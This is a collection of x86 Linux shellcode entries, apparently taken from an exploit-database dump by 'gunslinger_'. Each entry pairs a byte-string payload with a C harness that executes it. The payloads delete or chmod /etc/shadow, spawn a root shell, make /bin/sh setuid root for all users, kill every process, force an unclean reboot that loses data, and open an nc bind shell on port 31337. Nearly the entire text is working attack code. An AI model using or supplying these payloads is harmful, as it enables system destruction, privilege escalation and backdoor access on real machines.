 * then run the shellcode with your ip addr or just 127.000.000.001
*/




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Name   : 33 bytes unlink "/etc/shadow" x86 linux shellcode
Date   : Wed Jun  2 18:01:44 2010
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
*/
#include <stdio.h>

char *shellcode=
		"\xeb\x0f"                    /* jmp    0x8048071 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x0a"                    /* mov    $0xa,%al */
		"\x5b"                        /* pop    %ebx */
		"\xcd\x80"                    /* int    $0x80 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x01"                    /* mov    $0x1,%al */
		"\x31\xdb"                    /* xor    %ebx,%ebx */
		"\xcd\x80"                    /* int    $0x80 */
		"\xe8\xec\xff\xff\xff"        /* call   0x8048062 */
		"\x2f"                        /* das     */
		"\x65"                        /* gs */
		"\x74\x63"                    /* je     0x80480dd */
		"\x2f"                        /* das     */
		"\x73\x68"                    /* jae    0x80480e5 */
		"\x61"                        /* popa    */
		"\x64\x6f"                    /* outsl  %fs		"(%esi),(%dx) */
		"\x77";                        /* .byte 0x77 */

int main(void)
{
		fprintf(stdout,"Length: %d\n",strlen(shellcode));
		((void (*)(void)) shellcode)();
		return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
Name   : 6 bytes sys_sync x86 linux shellcode
Date   : may, 31 2010
Author : gunslinger_
Web    : devilzc0de.com
blog   : gunslingerc0de.wordpress.com
tested on : ubuntu linux
*/

char *shellcode=
 "\x31\xc0"                    /* xor    %eax,%eax */
 "\xb0\x24"                    /* mov    $0x24,%al */
 "\xcd\x80";                   /* int    $0x80 */

int main(void)
{
		((void (*)(void)) shellcode)();
		return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Name   : 39 bytes sys_setuid(0) & sys_setgid(0) & execve ("/bin/sh") x86 linux shellcode
Date   : Tue Jun  1 21:29:10 2010
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
*/
#include <stdio.h>

char *shellcode=
		"\xeb\x19"                    /* jmp    0x804807b */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x17"                    /* mov    $0x17,%al */
		"\x31\xdb"                    /* xor    %ebx,%ebx */
		"\xcd\x80"                    /* int    $0x80 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x2e"                    /* mov    $0x2e,%al */
		"\x31\xdb"                    /* xor    %ebx,%ebx */
		"\xcd\x80"                    /* int    $0x80 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x0b"                    /* mov    $0xb,%al */
		"\x5b"                        /* pop    %ebx */
		"\x89\xd1"                    /* mov    %edx,%ecx */
		"\xcd\x80"                    /* int    $0x80 */
		"\xe8\xe2\xff\xff\xff"        /* call   0x8048062 */
		"\x2f"                        /* das     */
		"\x62\x69\x6e"                /* bound  %ebp,0x6e(%ecx) */
		"\x2f"                        /* das     */
		"\x73\x68"                    /* jae    0x80480ef */
		"";

int main(void)
{
		fprintf(stdout,"Length: %d\n",strlen(shellcode));
		((void (*)(void)) shellcode)();
		return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Title  : sethostname "pwned !!"
Name   : 32 bytes sys_sethostname("PwNeD !!",8) x86 linux shellcode
Date   : may, 31 2009
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : devilzc0de.com
blog   : gunslingerc0de.wordpress.com
tested on : linux debian
*/

#include <stdio.h>

char *shellcode=
 "\xeb\x11"                    /* jmp    0x8048073 */
 "\x31\xc0"                    /* xor    %eax,%eax */
 "\xb0\x4a"                    /* mov    $0x4a,%al */
 "\x5b"                        /* pop    %ebx */
 "\xb1\x08"                    /* mov    $0x8,%cl */
 "\xcd\x80"                    /* int    $0x80 */
 "\x31\xc0"                    /* xor    %eax,%eax */
 "\xb0\x01"                    /* mov    $0x1,%al */
 "\x31\xdb"                    /* xor    %ebx,%ebx */
 "\xcd\x80"                    /* int    $0x80 */
 "\xe8\xea\xff\xff\xff"        /* call   0x8048062 */
 "\x50"                        /* push   %eax */
 "\x77\x4e"                    /* ja     0x80480c9 */
 "\x65"                        /* gs */
 "\x44"                        /* inc    %esp */
 "\x20\x21"                    /* and    %ah,(%ecx) */
 "\x21";                        /* .byte 0x21 */

int main(void)
{
		fprintf(stdout,"Length: %d\n",strlen(shellcode));
		((void (*)(void)) shellcode)();
		return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Name   : 41 bytes sys_rmdir("/tmp/willdeleted") x86 linux shellcode
Date   : may, 31 2010
Author : gunslinger_
Web    : devilzc0de.com
blog   : gunslingerc0de.wordpress.com
tested on : linux debian


root@localhost:/home/gunslinger/shellcode# objdump -d rmdir

rmdir:     file format elf32-i386

Disassembly of section .text:

08048060 <.text>:
 8048060:	eb 11                	jmp    0x8048073
 8048062:	31 c0                	xor    %eax,%eax
 8048064:	b0 28                	mov    $0x28,%al
 8048066:	31 db                	xor    %ebx,%ebx
 8048068:	5b                   	pop    %ebx
 8048069:	cd 80                	int    $0x80
 804806b:	31 c0                	xor    %eax,%eax
 804806d:	b0 01                	mov    $0x1,%al
 804806f:	31 db                	xor    %ebx,%ebx
 8048071:	cd 80                	int    $0x80
 8048073:	e8 ea ff ff ff       	call   0x8048062
 8048078:	2f                   	das    
 8048079:	74 6d                	je     0x80480e8
 804807b:	70 2f                	jo     0x80480ac
 804807d:	77 69                	ja     0x80480e8
 804807f:	6c                   	insb   (%dx),%es:(%edi)
 8048080:	6c                   	insb   (%dx),%es:(%edi)
 8048081:	64                   	fs
 8048082:	65                   	gs
 8048083:	6c                   	insb   (%dx),%es:(%edi)
 8048084:	65                   	gs
 8048085:	74 65                	je     0x80480ec
 8048087:	64                   	fs
root@localhost:/home/gunslinger/shellcode#
*/

#include <stdio.h>

char pussy[] =  "\xeb\x11\x31\xc0\xb0\x28\x31"
		"\xdb\x5b\xcd\x80\x31\xc0\xb0"
		"\x01\x31\xdb\xcd\x80\xe8\xea"
		"\xff\xff\xff\x2f\x74\x6d\x70"
		"\x2f\x77\x69\x6c\x6c\x64\x65"
		"\x6c\x74\x65\x74\x65\x64";

int main(void)
{
	(*(void(*)()) pussy)();
     
return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
1               #########################################              1
0               I'm gunslinger_ member from Inj3ct0r Team              1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
Title  : kill all running process 
Name   : 11 bytes sys_kill(-1,9) x86 linux shellcode
Date   : may, 31 2010
Author : gunslinger_
Web    : devilzc0de.com
blog   : gunslingerc0de.wordpress.com
tested on : ubuntu linux
*/
#include <stdio.h>

char *killer=
 "\x31\xc0"                    /* xor    %eax,%eax */
 "\xb0\x25"                    /* mov    $0x25,%al */
 "\x6a\xff"                    /* push   $0xffffffff */
 "\x5b"                        /* pop    %ebx */
 "\xb1\x09"                    /* mov    $0x9,%cl */
 "\xcd\x80"                    /* int    $0x80 */


int main(void)
{
		fprintf(stdout,"Length: %d\n",strlen(killer));
		((void (*)(void)) killer)();
		return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Name   : 8 bytes sys_exit(0) x86 linux shellcode
Date   : may, 31 2010
Author : gunslinger_
Web    : devilzc0de.com
blog   : gunslinger.devilzc0de.com
tested on : linux debian
*/

char *bye=
 "\x31\xc0"                    /* xor    %eax,%eax */
 "\xb0\x01"                    /* mov    $0x1,%al */
 "\x31\xdb"                    /* xor    %ebx,%ebx */
 "\xcd\x80";                   /* int    $0x80 */

int main(void)
{
		((void (*)(void)) bye)();
		return 0;
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Name   : 55 bytes sys_execve("/bin/sh", "-c", "ping localhost") x86 linux shellcode
Date   : may, 31 2010
Author : gunslinger_
Web    : devilzc0de.com
blog   : gunslinger.devilzc0de.com
tested on : linux debian
*/

char asshole[] = "\x6a\x0b"             // push   $0xb
		"\x58"                  // pop    %eax
		"\x99"                  // cltd
		"\x52"                  // push   %edx
		"\x68\x73\x74\x20\x20"  // push   $0x20207473
		"\x68\x61\x6c\x68\x6f"  // push   $0x6f686c61
		"\x68\x20\x6c\x6f\x63"  // push   $0x636f6c20
		"\x68\x70\x69\x6e\x67"  // push   $0x676e6970
		"\x89\xe6"              // mov    %esp,%esi
		"\x52"                  // push   %edx
		"\x66\x68\x2d\x63"      // pushw  $0x632d
		"\x89\xe1"              // mov    %esp,%ecx
		"\x52"                  // push   %edx
		"\x68\x2f\x2f\x73\x68"  // push   $0x68732f2f
		"\x68\x2f\x62\x69\x6e"  // push   $0x6e69622f
		"\x89\xe3"              // mov    %esp,%ebx
		"\x52"                  // push   %edx
		"\x56"                  // push   %esi
		"\x51"                  // push   %ecx
		"\x53"                  // push   %ebx
		"\x89\xe1"              // mov    %esp,%ecx
		"\xcd\x80";             // int    $0x80
		
int main(int argc, char **argv)
{
  int (*func)();
  func = (int (*)()) asshole;
  (int)(*func)();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
1               #########################################              1
0               I'm gunslinger_ member from Inj3ct0r Team              1
1               #########################################              0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
/*
Title  : change mode 0777 of "/etc/shadow" with sys_chmod syscall
Name   : 39 bytes sys_chmod("/etc/shadow",599) x86 linux shellcode
Date   : jun, 1 2010
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : devilzc0de.com
blog   : gunslingerc0de.wordpress.com
tested on : linux debian
*/

#include <stdio.h>

char *shellcode=
 "\xeb\x15"                    /* jmp    0x8048077 */
 "\x31\xc0"                    /* xor    %eax,%eax */
 "\xb0\x0f"                    /* mov    $0xf,%al */
 "\x5b"                        /* pop    %ebx */
 "\x31\xc9"                    /* xor    %ecx,%ecx */
 "\x66\xb9\xff\x01"            /* mov    $0x1ff,%cx */
 "\xcd\x80"                    /* int    $0x80 */
 "\x31\xc0"                    /* xor    %eax,%eax */
 "\xb0\x01"                    /* mov    $0x1,%al */
 "\x31\xdb"                    /* xor    %ebx,%ebx */
 "\xcd\x80"                    /* int    $0x80 */
 "\xe8\xe6\xff\xff\xff"        /* call   0x8048062 */
 "\x2f"                        /* das     */
 "\x65"                        /* gs */
 "\x74\x63"                    /* je     0x80480e3 */
 "\x2f"                        /* das     */
 "\x73\x68"                    /* jae    0x80480eb */
 "\x61"                        /* popa    */
 "\x64\x6f"                    /* outsl  %fs "(%esi),(%dx) */
 "\x77";                        /* .byte 0x77 */

int main(void)
{
		fprintf(stdout,"Length: %d\n",strlen(shellcode));
		((void (*)(void)) shellcode)();
		return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
Title  : setdomainname to "th1s s3rv3r h4s b33n h1j4ck3d !!"
Name   : 58 bytes sys_setdomainname ("th1s s3rv3r h4s b33n h1j4ck3d !!") x86 linux shellcode
Date   : Wed Jun  2 19:57:34 2010
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
greetz to : flyff666, mywisdom, kiddies, petimati, ketek, whitehat, and all devilzc0de family 
*/
#include <stdio.h>

char *shellcode=
		"\xeb\x13"                    /* jmp    0x8048075 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x79"                    /* mov    $0x79,%al */
		"\x5b"                        /* pop    %ebx */
		"\x31\xc9"                    /* xor    %ecx,%ecx */
		"\xb1\x20"                    /* mov    $0x20,%cl */
		"\xcd\x80"                    /* int    $0x80 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x01"                    /* mov    $0x1,%al */
		"\x31\xdb"                    /* xor    %ebx,%ebx */
		"\xcd\x80"                    /* int    $0x80 */
		"\xe8\xe8\xff\xff\xff"        /* call   0x8048062 */
		"\x74\x68"                    /* je     0x80480e4 */
		"\x31\x73\x20"                /* xor    %esi,0x20(%ebx) */
		"\x73\x33"                    /* jae    0x80480b4 */
		"\x72\x76"                    /* jb     0x80480f9 */
		"\x33\x72\x20"                /* xor    0x20(%edx),%esi */
		"\x68\x34\x73\x20\x62"        /* push   $0x62207334 */
		"\x33\x33"                    /* xor    (%ebx),%esi */
		"\x6e"                        /* outsb  %ds		"(%esi),(%dx) */
		"\x20\x68\x31"                /* and    %ch,0x31(%eax) */
		"\x6a\x34"                    /* push   $0x34 */
		"\x63\x6b\x33"                /* arpl   %bp,0x33(%ebx) */
		"\x64\x20\x21"                /* and    %ah,%fs		"(%ecx) */
		"\x21";                        /* .byte 0x21 */

int main(void)
{
		fprintf(stdout,"Length: %d\n",strlen(shellcode));
		((void (*)(void)) shellcode)();
		return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Title  : nc -lp 31337 -e /bin//sh polymorphic linux shellcode .
Name   : 91 bytes nc -lp 31337 -e /bin//sh polymorphic linux shellcode .
Date   : Mon Jul  5 16:58:50 WIT 2010
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com), ty miller (projectshellcode.com), jonathan salwan(shell-storm.org),
		    mywisdom (devilzc0de.org), loneferret (offensive-security.com)
greetzz to all devilzc0de, jasakom, yogyacarderlink, serverisdown, indonesianhacker and all my friend !!
*/
 
#include <stdio.h>
 
char shellcode[] = "\xeb\x11\x5e\x31\xc9\xb1\x43\x80\x6c\x0e\xff\x35\x80\xe9\x01"
           	   "\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x95\x66\xf5\x66\x07\xe5"
          	   "\x40\x87\x9d\xa3\x64\xa8\x9d\x9d\x64\x64\x97\x9e\xbe\x18\x87"
           	   "\x9d\x62\x98\x98\x98\xbe\x16\x87\x20\x3c\x86\x88\xbe\x16\x02"
           	   "\xb5\x96\x1d\x29\x34\x34\x34\xa3\x98\x55\x62\xa1\xa5\x55\x68"
           	   "\x66\x68\x68\x6c\x55\x62\x9a\x55\x64\x97\x9e\xa3\x64\x64\xa8"
           	   "\x9d";
         
int main(void)
{
    fprintf(stdout,"Length: %d\n",strlen(shellcode));
    (*(void(*)()) shellcode)();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
Title  : hard reboot (without any message) and data will be lost shellcode
Name   : 29 bytes hard / unclean reboot with data will be lost x86 linux shellcode 
Date   : Thu Jun  3 12:56:45 2010
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux ubuntu 9.04 , may cause fsck and fsck is failed (run fsck manually as root)
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com), ty miller (projectshellcode.com), jonathan salwan(shell-storm.org), mywisdom (devilzc0de.org)
greetz to : flyff666, whitehat, ketek, chaer, peneter, and all devilzc0de crew
*/
#include <stdio.h>

char *shellcode=
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x58"                    /* mov    $0x58,%al */
		"\xbb\xad\xde\xe1\xfe"        /* mov    $0xfee1dead,%ebx */
		"\xb9\x69\x19\x12\x28"        /* mov    $0x28121969,%ecx */
		"\xba\x67\x45\x23\x01"        /* mov    $0x1234567,%edx */
		"\xcd\x80"                    /* int    $0x80 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x01"                    /* mov    $0x1,%al */
		"\x31\xdb"                    /* xor    %ebx,%ebx */
		"\xcd\x80";                   /* int    $0x80 */

int main(void)
{
		fprintf(stdout,"Length: %d\n",strlen(shellcode));
		((void (*)(void)) shellcode)();
		return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
Title  : hard reboot (without any message) and data not lost shellcode
Name   : 33 bytes hard / unclean reboot but data not be lost x86 linux shellcode 
Date   : Thu Jun  3 12:54:55 2010
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux ubuntu 9.04 , may cause fsck on reboot
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com), ty miller (projectshellcode.com), jonathan salwan(shell-storm.org), mywisdom (devilzc0de.org)
greetz to : flyff666, whitehat, ketek, chaer, peneter, and all devilzc0de crew
*/
#include <stdio.h>

char *shellcode=
		"\xb0\x24"                    /* mov    $0x24,%al */
		"\xcd\x80"                    /* int    $0x80 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x58"                    /* mov    $0x58,%al */
		"\xbb\xad\xde\xe1\xfe"        /* mov    $0xfee1dead,%ebx */
		"\xb9\x69\x19\x12\x28"        /* mov    $0x28121969,%ecx */
		"\xba\x67\x45\x23\x01"        /* mov    $0x1234567,%edx */
		"\xcd\x80"                    /* int    $0x80 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x01"                    /* mov    $0x1,%al */
		"\x31\xdb"                    /* xor    %ebx,%ebx */
		"\xcd\x80";                   /* int    $0x80 */

int main(void)
{
		fprintf(stdout,"Length: %d\n",strlen(shellcode));
		((void (*)(void)) shellcode)();
		return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
Name   : 45 bytes give all user root access when execute /bin/sh x86 linux shellcode
Date   : Sat Jun  5 16:10:00 2010
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com), ty miller (projectshellcode.com), jonathan salwan(shell-storm.org), mywisdom (devilzc0de.org)
greetz to : flyff666, whitehat, ketek, chaer, peneter, cruz3n and all devilzc0de crew
*/
#include <stdio.h>

char *shellcode=
		"\xeb\x1f"                    /* jmp    0x8048081 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\xb6"                    /* mov    $0xb6,%al */
		"\x5b"                        /* pop    %ebx */
		"\x31\xc9"                    /* xor    %ecx,%ecx */
		"\x31\xd2"                    /* xor    %edx,%edx */
		"\xcd\x80"                    /* int    $0x80 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x0f"                    /* mov    $0xf,%al */
		"\x89\xdb"                    /* mov    %ebx,%ebx */
		"\x66\xb9\xed\x09"            /* mov    $0x9ed,%cx */
		"\xcd\x80"                    /* int    $0x80 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x01"                    /* mov    $0x1,%al */
		"\x31\xdb"                    /* xor    %ebx,%ebx */
		"\xcd\x80"                    /* int    $0x80 */
		"\xe8\xdc\xff\xff\xff"        /* call   0x8048062 */
		"\x2f"                        /* das     */
		"\x62\x69\x6e"                /* bound  %ebp,0x6e(%ecx) */
		"\x2f"                        /* das     */
		"\x73\x68";                   /* jae    0x80480f5 */

int main(void)
{
		fprintf(stdout,"Length: %d\n",strlen(shellcode));
		((void (*)(void)) shellcode)();
		return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
Title  : force unmount "/media/disk" x86 linux shellcode (some data cause lost)
Name   : 33 bytes force unmount "/media/disk" linux x68 shellcode
Date   : Fri Jun  4 13:15:51 2010
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux debian
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com), ty miller (projectshellcode.com), jonathan salwan(shell-storm.org), mywisdom (devilzc0de.org)
greetz to : flyff666, whitehat, ketek, chaer, peneter, and all devilzc0de crew
*/
#include <stdio.h>

char *shellcode=
		"\xeb\x0f"                    /* jmp    0x8048071 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x34"                    /* mov    $0x34,%al */
		"\x5b"                        /* pop    %ebx */
		"\xcd\x80"                    /* int    $0x80 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x01"                    /* mov    $0x1,%al */
